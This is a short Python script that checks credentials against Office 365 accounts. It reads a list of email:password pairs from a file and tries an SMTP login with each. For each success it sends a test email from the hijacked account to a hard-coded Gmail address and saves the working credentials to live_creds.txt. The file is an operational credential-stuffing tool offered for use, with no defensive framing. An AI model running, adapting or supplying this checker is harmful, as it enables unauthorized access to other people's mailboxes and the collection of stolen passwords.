import smtplib
import ssl
from termcolor import colored

def chk_creds(email, password, receiver_email):
    try:
        smtp_server = "smtp.office365.com"
        port = 587
        context = ssl.create_default_context()

        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls(context=context)
            server.login(email, password)

            subject = "SMTP Login Test"
            body = "This is a test email."
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(email, receiver_email, message)

            # Save live credentials
            with open('live_creds.txt', 'a') as live_file:
                live_file.write(f"{email}:{password}\n")
            
            print(colored(f"\t Success: {email}", 'green'))
            return True
    except Exception as e:
        print(colored(f"\t Failed: {email.split('@')[0]}", 'red'))
        return False

def main():
    receiver_email = "shifat69.01@gmail.com"

    with open('raw.txt', 'r') as file:
        lines = file.readlines()

    for line in lines:
        email, password = line.strip().split(':')
        chk_creds(email, password, receiver_email)

if __name__ == "__main__":
    main()
